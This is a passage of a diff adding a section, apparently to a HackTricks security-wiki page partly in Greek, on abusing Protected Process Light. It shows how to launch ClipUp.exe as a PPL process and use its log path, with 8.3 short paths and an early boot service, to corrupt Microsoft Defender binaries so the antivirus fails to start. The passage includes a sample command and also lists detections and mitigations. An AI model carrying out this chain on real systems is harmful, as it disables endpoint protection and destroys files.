+- Η διαδικασία πρέπει να δημιουργηθεί με CreateProcess χρησιμοποιώντας τις σημαίες: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
+- Πρέπει να ζητηθεί ένα συμβατό protection level που να ταιριάζει με τον signer του binary (π.χ., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` για anti-malware signers, `PROTECTION_LEVEL_WINDOWS` για Windows signers). Λανθασμένα επίπεδα θα αποτύχουν κατά τη δημιουργία.
+
+See also a broader intro to PP/PPL and LSASS protection here:
+
+{{#ref}}
+stealing-credentials/credentials-protections.md
+{{#endref}}
+
+Launcher tooling
+- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
+- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
+- Usage pattern:
+```text
+CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
+# example: spawn a Windows-signed component at PPL level 1 (Windows)
+CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
+# example: spawn an anti-malware signed component at level 3
+CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
+```
+LOLBIN primitive: ClipUp.exe
+- The signed system binary `C:\Windows\System32\ClipUp.exe` δημιουργεί αυτόνομο process και δέχεται μια παράμετρο για να γράψει ένα log αρχείο σε μονοπάτι που καθορίζεται από τον καλούντα.
+- When launched as a PPL process, the file write occurs with PPL backing.
+- ClipUp cannot parse paths containing spaces; use 8.3 short paths to point into normally protected locations.
+
+8.3 short path helpers
+- Λίστα short names: `dir /x` σε κάθε parent directory.
+- Εξαγωγή short path στο cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`
+
+Abuse chain (abstract)
+1) Εκκινήστε το PPL-capable LOLBIN (ClipUp) με `CREATE_PROTECTED_PROCESS` χρησιμοποιώντας ένα launcher (π.χ. CreateProcessAsPPL).
+2) Περάστε το ClipUp log-path argument για να εξαναγκάσετε τη δημιουργία αρχείου σε ένα προστατευμένο AV directory (π.χ., Defender Platform). Χρησιμοποιήστε 8.3 short names αν χρειάζεται.
+3) Αν το target binary είναι συνήθως ανοιχτό/κλειδωμένο από το AV ενώ τρέχει (π.χ., MsMpEng.exe), προγραμματίστε την εγγραφή κατά το boot πριν ξεκινήσει το AV εγκαθιστώντας μια auto-start service που εκτελείται πιο νωρίς. Επαληθεύστε το boot ordering με Process Monitor (boot logging).
+4) Κατά το reboot η PPL-backed εγγραφή συμβαίνει πριν το AV κλειδώσει τα binaries του, καταστρέφοντας το target αρχείο και αποτρέποντας την εκκίνηση.
+
+Example invocation (paths redacted/shortened for safety):
+```text
+# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
+CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
+```
+Σημειώσεις και περιορισμοί
+- Δεν μπορείτε να ελέγξετε τα περιεχόμενα που γράφει το ClipUp πέραν της τοποθέτησης· το primitive είναι κατάλληλο για καταστροφή/φθορά παρά για ακριβή εισαγωγή περιεχομένου.
+- Απαιτεί τοπικό admin/SYSTEM για να εγκαταστήσετε/εκκινήσετε μια υπηρεσία και ένα παράθυρο επανεκκίνησης.
+- Ο χρονισμός είναι κρίσιμος: ο στόχος δεν πρέπει να είναι ανοιχτός· η εκτέλεση κατά την εκκίνηση (boot-time) αποφεύγει το κλείδωμα αρχείων.
+
+Ανιχνεύσεις
+- Δημιουργία διεργασίας του `ClipUp.exe` με ασυνήθιστα ορίσματα, ειδικά όταν έχει parent από μη-τυπικούς launchers, κοντά στην εκκίνηση.
+- Νέες υπηρεσίες ρυθμισμένες να auto-start ύποπτα binaries και που ξεκινούν επανειλημμένα πριν το Defender/AV. Ερευνήστε τη δημιουργία/τροποποίηση υπηρεσίας πριν από σφάλματα εκκίνησης του Defender.
+- Παρακολούθηση ακεραιότητας αρχείων στα Defender binaries/Platform directories· απροσδόκητες δημιουργίες/τροποποιήσεις αρχείων από διεργασίες με protected-process flags.
+- ETW/EDR telemetry: αναζητήστε διεργασίες που δημιουργούνται με `CREATE_PROTECTED_PROCESS` και ανώμαλη χρήση επιπέδου PPL από non-AV binaries.
+
+Μέτρα μετριασμού
+- WDAC/Code Integrity: περιορίστε ποια signed binaries μπορούν να τρέχουν ως PPL και υπό ποιους parents· μπλοκάρετε την κλήση του ClipUp εκτός νόμιμων contexts.
+- Service hygiene: περιορίστε τη δημιουργία/τροποποίηση auto-start υπηρεσιών και παρακολουθήστε χειρισμούς της σειράς εκκίνησης.
+- Βεβαιωθείτε ότι το Defender tamper protection και τα early-launch protections είναι ενεργοποιημένα· ερευνήστε σφάλματα εκκίνησης που υποδεικνύουν φθορά δυαδικών αρχείων.
+- Σκεφτείτε την απενεργοποίηση της 8.3 short-name generation σε volumes που φιλοξενούν εργαλεία ασφαλείας, αν είναι συμβατό με το περιβάλλον σας (δοκιμάστε διεξοδικά).
+
+Αναφορές για PPL και εργαλεία
+- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
+- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
+- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
+- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
+- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html
+
+## References
 
 - [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
 - [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
 - [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
+- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
+- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
+- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
+- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
+- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
 
 {{#include ../banners/hacktricks-training.md}}
